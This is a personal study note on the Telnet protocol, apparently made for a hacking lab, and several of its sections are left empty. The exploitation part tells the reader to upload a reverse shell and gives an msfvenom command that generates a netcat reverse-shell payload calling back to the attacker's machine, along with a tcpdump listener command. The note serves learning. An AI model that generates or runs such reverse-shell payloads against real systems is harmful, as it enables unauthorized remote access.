
***
###### `Title :- Telnet`
###### `Created on :- 2023-08-05 - 13:04`
###### `Created by:- Prem J`
***
#### `Brief -->`



#### `Used For -->`

- Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

#### `How does it work -->`

- The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.
- The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt.
- The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: `telnet [ip] [port]`

#### `Advantages -->`



#### `Alternatives -->`



#### `Configuration Files -->`


#### `Commands -->`


#### `Vulnerabilities -->`

- Telnet sends all messages in ***clear text*** and has no specific security mechanisms. 

#### `Exploitation -->`

- It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control
- There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
	- [https://www.cvedetails.com/](https://www.cvedetails.com/)
	- [https://cve.mitre.org/](https://cve.mitre.org/)[](https://cve.mitre.org/)
- We can connect to target and upload a reverse shell to gain access to the target system

![[Pasted image 20230805141857.png]]
#### `Remedies -->`

- Thus, in many applications and services, Telnet has been ***replaced by SSH*** in most implementations.

>[!Note]
>Start a tcpdump listener on your local machine.
>**If using your own machine with the OpenVPN connection, use:**  
>- `sudo tcpdump ip proto \\icmp -i tun0`

>[!Note]
>We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  
>`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
>-p = payload
>lhost = our local host IP address (this is **your** machine's IP address)
>lport = the port to listen on (this is the port on **your** machine)
>R = export the payload in raw format

#### `Footprinting Walkthrough -->`



#### `Summary -->`